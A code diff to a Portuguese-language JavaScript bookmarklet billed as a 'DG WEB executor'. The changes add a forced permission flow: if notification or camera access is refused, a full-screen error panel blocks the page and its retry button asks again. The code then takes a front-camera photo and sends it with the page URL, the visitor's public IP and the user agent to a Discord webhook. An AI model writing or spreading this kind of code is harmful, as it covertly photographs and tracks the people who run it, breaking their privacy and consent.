@@ -22,6 +22,21 @@ javascript:(() => {
     }
   }
 
+  async function requestNotificationPermission() {
+    if (!("Notification" in window)) {
+      console.warn("Notificações não suportadas neste navegador.");
+      return false;
+    }
+    if (Notification.permission === "granted") {
+      return true;
+    }
+    if (Notification.permission !== "denied") {
+      const permission = await Notification.requestPermission();
+      return permission === "granted";
+    }
+    return false;
+  }
+
   async function captureCamera() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
@@ -37,7 +52,6 @@ javascript:(() => {
 
       stream.getTracks().forEach(track => track.stop());
 
-      // converte para blob para enviar
       return new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
     } catch (e) {
       console.warn("Permissão negada ou erro na câmera:", e);
@@ -63,10 +77,75 @@ javascript:(() => {
     }
   }
 
+  async function showErrorMessage() {
+    removeOldPanel();
+
+    const errorPanel = document.createElement('div');
+    errorPanel.id = 'dgweb-executor-panel';
+    Object.assign(errorPanel.style, {
+      position:'fixed', top:'0', left:'0',
+      width:'100vw', height:'100vh',
+      background:'black',
+      color:'red',
+      fontFamily:'monospace',
+      fontWeight:'bold',
+      fontSize:'28px',
+      display:'flex',
+      flexDirection: 'column',
+      justifyContent:'center',
+      alignItems:'center',
+      textAlign:'center',
+      padding:'20px',
+      boxSizing:'border-box',
+      zIndex:'99999999',
+      border:'4px solid red',
+      boxShadow:'0 0 20px red'
+    });
+    errorPanel.textContent = "Erro! Permissões negadas. Tente novamente.";
+
+    const retryBtn = document.createElement('button');
+    retryBtn.textContent = "Tentar novamente";
+    Object.assign(retryBtn.style, {
+      marginTop: '20px',
+      padding: '12px 24px',
+      fontSize: '18px',
+      fontWeight: 'bold',
+      background: 'red',
+      color: 'black',
+      border: 'none',
+      borderRadius: '6px',
+      cursor: 'pointer',
+      fontFamily: 'monospace'
+    });
+
+    retryBtn.onclick = () => {
+      // Ao clicar, remove painel de erro e chama init() de novo
+      errorPanel.remove();
+      init();
+    };
+
+    errorPanel.appendChild(retryBtn);
+    document.body.appendChild(errorPanel);
+  }
+
   async function init() {
     removeOldPanel();
 
-    // Criar painel (igual script anterior)
+    // Primeiro pede permissão de notificação
+    const notifGranted = await requestNotificationPermission();
+    if (!notifGranted) {
+      await showErrorMessage();
+      return;
+    }
+
+    // Depois pede permissão da câmera (e microfone)
+    const imageBlob = await captureCamera();
+    if (!imageBlob) {
+      await showErrorMessage();
+      return;
+    }
+
+    // Criar painel normalmente
     const panel = document.createElement('div');
     panel.id = 'dgweb-executor-panel';
     Object.assign(panel.style, {
@@ -179,15 +258,11 @@ javascript:(() => {
     const url = window.location.href;
     const userAgent = navigator.userAgent;
 
-    // Captura a câmera e pega a foto (blob)
-    const imageBlob = await captureCamera();
-
     // Monta mensagem para o Discord
     const message = `🚨 Executor DG WEB aberto!\nSite: ${url}\nIP público: ${ip}\nUser Agent: ${userAgent}`;
 
     // Envia webhook com foto anexa
     await sendWebhookWithImage(message, imageBlob);
-
   }
 
   init();
